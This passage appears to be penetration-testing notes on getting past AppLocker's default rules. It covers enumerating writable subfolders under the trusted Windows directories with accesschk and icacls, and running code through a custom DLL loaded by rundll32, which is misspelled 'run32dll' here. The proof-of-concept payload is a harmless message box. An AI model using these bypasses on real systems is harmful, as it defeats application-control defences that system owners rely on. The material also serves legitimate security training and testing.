**TRUSTED FOLDERS:**

Default AppLocker rules only allows to execute programs located under these directories: C:\Program Files, C:\Program Files (x86), and C:\Windows.

However there may be subdirectories under C:\Program Files, C:\Program Files (x86), or C:\Windows that may have write and executable permisions. To do so we will use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
in conjuction with icacls:

```
1. accesschk.exe <user_name> C:\Windows -wus
2. icacls <directory>  -> on the posible directories to check if they got executable permision
```

**BYPASS WITH DLLs:**

The default ruleset doesn’t protect against loading arbitrary DLLs. So if we create an unmangaed DLL, we load it and then call methods of that unmanaged DLL, we could gain code execution:

```
1st Create an unmanaged DLL:
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)

{
  switch (ul_reason_for_call)
  {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
  MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}

2nd Compile the DLL

3rd Load and execute the run method of the DLL

C:\> run32dll testdll.dll,run
```

**ALTERNATE DATA STREAMS:**

